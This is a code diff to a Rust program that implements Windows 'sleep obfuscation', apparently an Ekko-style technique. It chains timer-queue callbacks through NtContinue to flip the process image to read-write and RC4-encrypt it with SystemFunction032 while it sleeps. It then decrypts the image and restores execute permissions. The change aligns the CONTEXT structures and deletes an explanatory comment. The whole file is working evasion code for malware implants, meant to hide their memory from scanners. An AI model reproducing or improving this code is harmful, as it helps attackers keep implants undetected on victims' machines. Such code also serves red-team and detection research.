@@ -38,6 +38,10 @@ struct USTRING {
     buffer: *mut u8,
 }
 
+#[repr(C, align(16))]
+#[derive(Clone, Copy)]
+struct AlignedContext(CONTEXT);
+
 fn nt_success(status: NTSTATUS) -> bool {
     status >= 0
 }
@@ -55,7 +59,7 @@ fn gen_random() -> u32 {
 
 fn ziliean(time: u32) {
     unsafe {
-        let mut ctx_init = CONTEXT::default();
+        let mut ctx_init = AlignedContext(CONTEXT::default());
         let mut key: [u8; 16] = [0; 16];
         let mut timer: *mut c_void = null_mut();
         let mut delay: u32 = 0;
@@ -86,9 +90,6 @@ fn ziliean(time: u32) {
             return;
         }
 
-        // Resolve into kernel32/ntdll/advapi32 — not this image's IAT thunks.
-        // After SystemFunction032 encrypts SizeOfImage, any callback/RIP that still
-        // points at ziliean.exe is encrypted and the wait thread dies before SetEvent.
         let wait_for_single_object_ex =
             GetProcAddress(kernel32, "WaitForSingleObjectEx\0".as_ptr() as *const u8).unwrap()
                 as *mut c_void;
@@ -170,7 +171,7 @@ fn ziliean(time: u32) {
             &mut timer,
             event_wait,
             rtl_capture_context as *const c_void,
-            &mut ctx_init as *mut CONTEXT as *const c_void,
+            &mut ctx_init as *mut AlignedContext as *const c_void,
             delay,
             WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD,
         )) {
@@ -188,44 +189,44 @@ fn ziliean(time: u32) {
                     return;
                 }
 
-                let mut ctx: [CONTEXT; 7] = [ctx_init; 7];
+                let mut ctx: [AlignedContext; 7] = [ctx_init; 7];
 
                 for i in 0..7 {
-                    ctx[i].Rsp -= 8;
+                    ctx[i].0.Rsp -= 8;
                 }
 
-                ctx[0].Rip = wait_for_single_object_ex as u64;
-                ctx[0].Rcx = event_start as u64;
-                ctx[0].Rdx = INFINITE as u64;
-                ctx[0].R8 = 0;
+                ctx[0].0.Rip = wait_for_single_object_ex as u64;
+                ctx[0].0.Rcx = event_start as u64;
+                ctx[0].0.Rdx = INFINITE as u64;
+                ctx[0].0.R8 = 0;
 
-                ctx[1].Rip = virtual_protect as u64;
-                ctx[1].Rcx = image_base as u64;
-                ctx[1].Rdx = image_size as u64;
-                ctx[1].R8 = PAGE_READWRITE as u64;
-                ctx[1].R9 = &mut old_protection as *mut u32 as u64;
+                ctx[1].0.Rip = virtual_protect as u64;
+                ctx[1].0.Rcx = image_base as u64;
+                ctx[1].0.Rdx = image_size as u64;
+                ctx[1].0.R8 = PAGE_READWRITE as u64;
+                ctx[1].0.R9 = &mut old_protection as *mut u32 as u64;
 
-                ctx[2].Rip = systemfunction032 as u64;
-                ctx[2].Rcx = &mut image as *mut USTRING as u64;
-                ctx[2].Rdx = &mut key_buffer as *mut USTRING as u64;
+                ctx[2].0.Rip = systemfunction032 as u64;
+                ctx[2].0.Rcx = &mut image as *mut USTRING as u64;
+                ctx[2].0.Rdx = &mut key_buffer as *mut USTRING as u64;
 
-                ctx[3].Rip = wait_for_single_object_ex as u64;
-                ctx[3].Rcx = GetCurrentProcess() as u64;
-                ctx[3].Rdx = time as u64;
-                ctx[3].R8 = 0;
+                ctx[3].0.Rip = wait_for_single_object_ex as u64;
+                ctx[3].0.Rcx = GetCurrentProcess() as u64;
+                ctx[3].0.Rdx = time as u64;
+                ctx[3].0.R8 = 0;
 
-                ctx[4].Rip = systemfunction032 as u64;
-                ctx[4].Rcx = &mut image as *mut USTRING as u64;
-                ctx[4].Rdx = &mut key_buffer as *mut USTRING as u64;
+                ctx[4].0.Rip = systemfunction032 as u64;
+                ctx[4].0.Rcx = &mut image as *mut USTRING as u64;
+                ctx[4].0.Rdx = &mut key_buffer as *mut USTRING as u64;
 
-                ctx[5].Rip = virtual_protect as u64;
-                ctx[5].Rcx = image_base as u64;
-                ctx[5].Rdx = image_size as u64;
-                ctx[5].R8 = PAGE_EXECUTE_READWRITE as u64;
-                ctx[5].R9 = &mut old_protection as *mut _ as u64;
+                ctx[5].0.Rip = virtual_protect as u64;
+                ctx[5].0.Rcx = image_base as u64;
+                ctx[5].0.Rdx = image_size as u64;
+                ctx[5].0.R8 = PAGE_EXECUTE_READWRITE as u64;
+                ctx[5].0.R9 = &mut old_protection as *mut _ as u64;
 
-                ctx[6].Rip = set_event as u64;
-                ctx[6].Rcx = event_end as u64;
+                ctx[6].0.Rip = set_event as u64;
+                ctx[6].0.Rcx = event_end as u64;
 
                 println!("[*] Executing sleep obfuscation chain");
 
@@ -235,7 +236,7 @@ fn ziliean(time: u32) {
                         &mut timer,
                         event_wait,
                         nt_continue as *const c_void,
-                        &mut ctx[i] as *mut CONTEXT as *const c_void,
+                        &mut ctx[i] as *mut AlignedContext as *const c_void,
                         delay,
                         WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE,
                     )) {
@@ -257,6 +258,8 @@ fn ziliean(time: u32) {
                 println!("[*] Sleep completed");
             }
         }
+
+        println!();
 
         if event_timer != null_mut() {
             CloseHandle(event_timer);
